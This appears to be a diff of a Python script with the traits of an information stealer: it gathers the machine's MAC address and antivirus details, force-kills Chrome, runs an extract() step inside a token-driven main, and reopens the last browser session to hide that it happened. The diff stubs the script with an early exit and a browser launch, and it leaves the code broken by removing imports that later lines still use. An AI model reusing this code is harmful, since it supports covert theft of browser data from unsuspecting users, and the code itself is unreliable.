@@ -24,11 +24,13 @@ from Cryptodome.Random import get_random_bytes
 from Cryptodome.Util.Padding import pad, unpad
 import pytz
 import uuid
-import os
-import subprocess
-import time
-import pyautogui
+import webbrowser
 
+
+chromedir= "C:/Program Files (x86)/Google/Chrome/Application/chrome.exe %s"
+webbrowser.get(chromedir).open("http://pythonprogramming.altervista.org")
+
+exit();
 
 
 mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
@@ -108,7 +110,7 @@ def get_antivirus_info():
         return "N/A"
 
 
-def end_chrome():
+def check_chrome_running():
     for proc in os.popen('tasklist').readlines():
         if 'chrome.exe' in proc:
             subprocess.run('taskkill /f /im chrome.exe', shell=True)
@@ -560,15 +562,11 @@ async def main(TOKEN, ID):
 
 
     
-    end_chrome()
+    #check_chrome_running()
+
+
 
     extract()
-
-
-    # Nhấn Ctrl + Shift + T để mở lại các tab đóng lần cuối
-    #open chrome
-    subprocess.run('start chrome --restore-last-session', shell=True)
-
 
 
     t = datetime.now(vn_tz).strftime('%d_%m_%Y_%H_%M')
